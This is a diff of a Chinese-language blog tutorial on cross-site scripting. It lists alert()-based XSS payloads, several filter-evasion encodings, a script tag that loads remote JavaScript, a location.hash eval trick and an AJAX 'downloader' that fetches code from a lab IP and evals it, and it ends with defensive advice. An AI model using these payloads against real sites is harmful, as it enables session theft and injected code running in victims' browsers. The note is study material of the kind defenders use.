@@ -848,23 +848,19 @@ $ hexo d # == hexo deploy 上传 </code></pre>
 <h2 id="XSS的构造"><a href="#XSS的构造" class="headerlink" title="XSS的构造"></a>XSS的构造</h2><ol>
 <li>利用<code>&lt;&gt;</code>构造html/javascript<br>可以利用<code>&lt;&gt;</code>构造<code>html</code>标签或<code>&lt;script&gt;</code>标签。<br>在测试页面提交参数<code>&lt;h1 style=&#39;color:red&#39;&gt;利用&lt;&gt;构造html/js&lt;/h1&gt;</code>或提交<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></li>
 <li>伪协议<br>也可以使用javascript：伪协议的方式构造XSS。<br>提交参数<code>&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;touch me!&lt;/a&gt;</code>，然后点击超链接即可触发XSS。或使用<code>img</code>标签的伪协议（但是这种方法在IE6下测试成功）<code>&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code>。</li>
-<li>产生自己的事件<br>“事件驱动”是一种比较经典的编程思想，在网页中会发生很多事件（比如鼠标移动、键盘键入等），javascript可以对这些事件进行响应，所以我们可以通过事件触发js函数，触发XSS。</li>
-</ol>
-<ul>
+<li>产生自己的事件<br>“事件驱动”是一种比较经典的编程思想，在网页中会发生很多事件（比如鼠标移动、键盘键入等），javascript可以对这些事件进行响应，所以我们可以通过事件触发js函数，触发XSS。<ul>
 <li>事件种类<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">windows事件              对Windows对象触发的事件</span><br><span class="line">Form事件                 html表单内的动作触发事件</span><br><span class="line">Keyboard事件             键盘按键</span><br><span class="line">Mouse事件                由鼠标或类似用户动作触发的事件</span><br><span class="line">Media事件                由多媒体触发的事件</span><br></pre></td></tr></table></figure>
 如<code>&lt;img src=&#39;./smile.jpg&#39; onmouseover=&#39;alert(/xss/)&#39;&gt;</code>，这个标签会引入一个图片，当鼠标悬停在图片上时会触发XSS代码。<br>单行文本框的键盘点击事件<code>&lt;input type=&quot;text&quot; onkeydown=&quot;alert(/xss/)&quot;&gt;</code>，当点击键盘任意一个按键的时候触发。<br><code>&lt;input type=&quot;text&quot; onkeyup=&quot;alert(/xss/)&quot;&gt;</code><br><code>&lt;input type=&quot;button&quot; onclick=&quot;alert(/xss/)&quot;&gt;</code><br><code>&lt;img src=&#39;#&#39; onerror=&#39;alert(/xss/)&#39;&gt;</code></li>
 </ul>
-<ol start="4">
-<li>利用CSS跨站（old）<br>我们也可以利用CSS(层叠样式脚本)触发XSS，但是这种方法比较古老，基本不太适合现在主流的浏览器，我们可以稍作了解（以下代码均在IE6下测试）。</li>
-</ol>
-<ul>
-<li>行内样式<br><code>&lt;div style=&quot;background-image:url(javascript:alert(/xss/))&quot;&gt;</code></li>
-<li>页内样式<br><code>&lt;style&gt;Body&#123;background-image:url(javascript:alert(/xss/))&#125;&lt;/style&gt;</code></li>
-<li>外部样式<br><code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./xss.css&quot;&gt;&lt;div&gt;hello&lt;/div&gt;</code><br>xss.css文件内容如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">h1&#123;</span><br><span class="line">    color:red;</span><br><span class="line">&#125;</span><br><span class="line">div&#123;</span><br><span class="line">    &#x2F;* width:expression(alert(&#x2F;xss&#x2F;))*&#x2F;</span><br><span class="line">    background-image:url(javascript:alert(&#x2F;xss&#x2F;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
-<li>expression<br><code>&lt;div style=&quot;width:expression(alert(/xss/))&quot;&gt;</code><br><code>&lt;style&gt;Body&#123;background-image:expression(alert(/xss/));&#125;&lt;/style&gt;</code></li>
-<li>import<br><code>&lt;style&gt;@import &#39;javascript:alert(&quot;xss&quot;)&#39;;&lt;/style&gt;</code><br><code>&lt;style type=&quot;text/css&quot;&gt;@import url(xss.css);&lt;/style&gt;&lt;div&gt;xxx&lt;/div&gt;</code></li>
+</li>
+<li>利用CSS跨站（old）<br>我们也可以利用CSS(层叠样式脚本)触发XSS，但是这种方法比较古老，基本不太适合现在主流的浏览器，我们可以稍作了解（以下代码均在IE6下测试）。<ul>
+<li>行内样式<br>  <code>&lt;div style=&quot;background-image:url(javascript:alert(/xss/))&quot;&gt;</code></li>
+<li>页内样式<br>  <code>&lt;style&gt;Body&#123;background-image:url(javascript:alert(/xss/))&#125;&lt;/style&gt;</code></li>
+<li>外部样式<br>  <code>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;./xss.css&quot;&gt;&lt;div&gt;hello&lt;/div&gt;</code><br>  xss.css文件内容如下：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">h1&#123;</span><br><span class="line">    color:red;</span><br><span class="line">&#125;</span><br><span class="line">div&#123;</span><br><span class="line">    &#x2F;* width:expression(alert(&#x2F;xss&#x2F;))*&#x2F;</span><br><span class="line">    background-image:url(javascript:alert(&#x2F;xss&#x2F;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li>expression<br>  <code>&lt;div style=&quot;width:expression(alert(/xss/))&quot;&gt;</code><br>  <code>&lt;style&gt;Body&#123;background-image:expression(alert(/xss/));&#125;&lt;/style&gt;</code></li>
+<li>import<br>  <code>&lt;style&gt;@import &#39;javascript:alert(&quot;xss&quot;)&#39;;&lt;/style&gt;</code><br>  <code>&lt;style type=&quot;text/css&quot;&gt;@import url(xss.css);&lt;/style&gt;&lt;div&gt;xxx&lt;/div&gt;</code></li>
 </ul>
-<ol start="5">
+</li>
 <li>其他标签以及手法<br>我们也可以用其他标签触发XSS<br><code>&lt;svg onload=&quot;alert(/xss/)&quot;&gt;</code>这个语句还是比较简洁的。<br><code>&lt;input onfocus=alert(/xss/) autofocus&gt;</code></li>
 </ol>
 <h2 id="XSS的变形"><a href="#XSS的变形" class="headerlink" title="XSS的变形"></a>XSS的变形</h2><p>我们可以构造XSS进行各种变形，以绕过XSS过滤器的检测。变形方式主要有以下几种：</p>
@@ -872,7 +868,7 @@ $ hexo d # == hexo deploy 上传 </code></pre>
 <li>大小写转换<br>可以将payload进行大小写转换，如下面两个例子：<br><code>&lt;Img sRc=&#39;#&#39; Onerror=&quot;alert(/xss/)&quot; /&gt;</code><br><code>&lt;a hREf=&quot;javaScript:alert(/xss/)&quot;&gt;click me&lt;/a&gt;</code></li>
 <li>引号的使用<br>html语言中对引号的使用不敏感，但是某些过滤函数时“锱铢必较”<br><code>&lt;img src=&quot;#&quot; onerrpr=&quot;alert(/xss/)&quot; /&gt;</code><br><code>&lt;img src=&#39;#&#39; onerror=&#39;alert(/xss/)&#39; /&gt;</code><br><code>&lt;img src=# onerror=alert(/xss/) /&gt;</code></li>
 <li><code>/</code>可以代替空格<br>我们还可以使用<code>/</code>左斜线代替空格<br><code>&lt;Img/src=&#39;#&#39;/Onerror=&#39;alert(/xss/)&#39; /&gt;</code></li>
-<li>回车<br>我们可以在一些未知添加Tab(水平制表符)和回车符来绕过关键字检测。<br><code>&lt;Img/sRc=&#39;#&#39;/Onerror =&#39;alert(/xss/)&#39; /&gt;</code><br><code>&lt;A hREf=&quot;j avascript:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;</code></li>
+<li>回车<br>我们可以在一些未知添加Tab(水平制表符)和回车符来绕过关键字检测。<br><code>&lt;Img/sRc=&#39;#&#39;/Onerror =&#39;alert(/xss/)&#39; /&gt;</code><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;A hREf&#x3D;&quot;j</span><br><span class="line">avascript:alert(&#x2F;xss&#x2F;)&quot;&gt;click me!&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure></li>
 <li>对标签属性值进行转码<br>我们也可以对标签属性值进行转码来绕过过滤。对应编码如下：</li>
 </ol>
 <table>
@@ -901,7 +897,9 @@ $ hexo d # == hexo deploy 上传 </code></pre>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Tab     &amp;#9</span><br><span class="line">换行     &amp;#10</span><br><span class="line">回车     &amp;#13</span><br></pre></td></tr></table></figure>
 <p>可以将以下字符插入到头部位置：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SOH     &amp;#01</span><br><span class="line">STX     &amp;#02</span><br></pre></td></tr></table></figure>
-<p>经过编码后到样子：<br><code>&lt;A hREf=&quot;&amp;#01;j&amp;#97;v&amp;#x61;s&amp;#9;c&amp;#10;r&amp;#13;ipt:alert(/xss/)&quot;&gt; click me! &lt;/a&gt;</code></p>
+<p>经过编码后到样子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;A hREf&#x3D;&quot;&amp;#01;j&amp;#97;v&amp;#x61;s&amp;#9;c&amp;#10;r&amp;#13;ipt:alert(&#x2F;xss&#x2F;)&quot;&gt;</span><br><span class="line">click me!</span><br><span class="line">&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
 <ol start="6">
 <li>拆分跨站<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;z&#x3D;&#39;alert&#39;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;z&#x3D;z+&#39;(&#x2F;xss&#x2F;)&#39;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script&gt;eval(z)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li>
 <li>双写绕过<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure></li>
@@ -913,6 +911,26 @@ $ hexo d # == hexo deploy 上传 </code></pre>
 <li>样式表中的<code>\</code>和<code>\0</code><br><code>&lt;style&gt;@import &#39;javasc/ri/0pt:alert(&quot;xss&quot;)&#39;;&lt;/style&gt;</code></li>
 </ul>
 <h2 id="Shellcode的调用"><a href="#Shellcode的调用" class="headerlink" title="Shellcode的调用"></a>Shellcode的调用</h2><p>Shellcode就是在利用漏洞所执行的代码。<br>完整的XSS攻击，会将shellcode存放在一定的地方，然后触发漏洞调用shellcode。</p>
+<ul>
+<li>远程调用JS<br>可以将js的代码单独放在一个js文件中，然后通过http协议远程加载该脚本。如<code>&lt;script src=&quot;http://172.16.132.138/XSS-TEST/normal/xss.js&quot;&gt;&lt;/script&gt;</code>，这是比较常用的方式。<br>‘XSS.js’内容如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert(&#39;xss.js&#39;);</span><br></pre></td></tr></table></figure></li>
+<li>windows.location.hash<br>我们也可以使用js中windows.location.hash方法获取浏览器URL地址栏的XSS代码。这个方法或回去URL中<code>#</code>后面的内容。例如<code>http://domain.com/index.php#xxx</code>，windows.location.hash的值就是<code>xxx</code>。<br>所以我们可以构造以下代码直接提交到测试页面<code>xss.php</code>中：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?submit&#x3D;submit&amp;xsscode&#x3D;&lt;script&gt;eval(location.hash.substr(1))&lt;&#x2F;script&gt;#alert(&#x2F;This is windows.location.hash&#x2F;)</span><br></pre></td></tr></table></figure></li>
+<li>XSS Downloader<br>XSS下载器就是将XSS代码写到网页中，然后通过AJAX技术获取网页中的XSS代码。<br>在使用XSS Downloader之前需要一个我们自己的页面<code>xss_downloader.php</code>，内容如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~~~~BOF|alert(&#x2F;xss&#x2F;)|EOF~~~~~~~~~~~~~~</span><br></pre></td></tr></table></figure>
+常见下载器如下：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">function XSS()&#123;</span><br><span class="line">    if (window.XMLHttpRequest) &#123;</span><br><span class="line">        a &#x3D; new XMLHttpRequest();</span><br><span class="line">    &#125; else if (window.ActiveXObject) &#123;</span><br><span class="line">        a &#x3D; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    a &#x3D; open(&#39;get&#39;, &#39;http:&#x2F;&#x2F;172.16.132.161&#x2F;XSS_TEST&#x2F;normal&#x2F;xss_downloader.php&#39;, false);</span><br><span class="line">    a.send();</span><br><span class="line">    b &#x3D; a.respondeText;</span><br><span class="line">    eval(unescape(b.substring(b.index0f(&#39;BOF|&#39;)+4, b.index0f(&#39;|EOF&#39;))));</span><br><span class="line">&#125;</span><br><span class="line">XSS();</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+AJAX技术会收到浏览器同源策略的限制，而为了解决这个问题，我们需要在服务器代码中添加如下内容：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#39;Access-Control-Allow-Origin: *&#39;);</span><br><span class="line">header(&#39;Access-Control_Allow-Headers: Origin, X-Requested-With, Content-Type, Accept&#39;);</span><br></pre></td></tr></table></figure></li>
+<li>备选存储技术<br>我们可以把Shellcode存储在客户端的本地域中，比如HTTP Cookie、Flash共享对象、UserData、localStorage等。</li>
+</ul>
+<h2 id="XSS通关挑战"><a href="#XSS通关挑战" class="headerlink" title="XSS通关挑战"></a>XSS通关挑战</h2><p>是一个练习XSS绕过和展示各种XSS场景的靶机环境,推荐xss-labs。<br>这里找到一个在线的练习环境<a href="http://xss-ctf.xiejiahe.com/">XSS-CTF</a>,只需要点击图片就可以开始挑战。</p>
+<h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><ol>
+<li>使用XSS Filter<br>其作用是过滤用户（客户端）提交的有害信息，从而达到防范XSS攻击的效果。<ul>
+<li>输入过滤<br>“永远不要相信用户的输入”是网站开发的基本常识，对于用户输入一定要过滤，过滤再过滤。</li>
+<li>输入验证<br>即对用户提交信息进行有效验证，仅接受指定长度范围内的，采用适当格式的内容提交，阻止或忽略除此之外的其他任何数据。<br>  输入是否仅包含合法的字符<br>  输入字符是否超过最大长度限制<br>  输入如果为数字，数字是否在指定的范围<br>  输入是否符合特殊的格式要求，如E-mail地址、IP地址等</li>
+<li>数据消毒<br>过滤和精华掉有害的输入</li>
+<li>输出编码<br>HTML编码主要是用对应的HTML实体代替字符</li>
+<li>黑白名单<br>不管是采用输入过滤还是输出编码，都是针对数据信息进行黑｜白名单式的过滤<br>黑名单，非允许数据<br>白名单，允许的数据</li>
+</ul>
+</li>
+</ol>
+<h2 id="防御DOM-XSS"><a href="#防御DOM-XSS" class="headerlink" title="防御DOM-XSS"></a>防御DOM-XSS</h2><p>避免客户端文档重写、重定向或其他敏感操作。</p>
 ]]></content>
       <categories>
         <category>笔记</category>
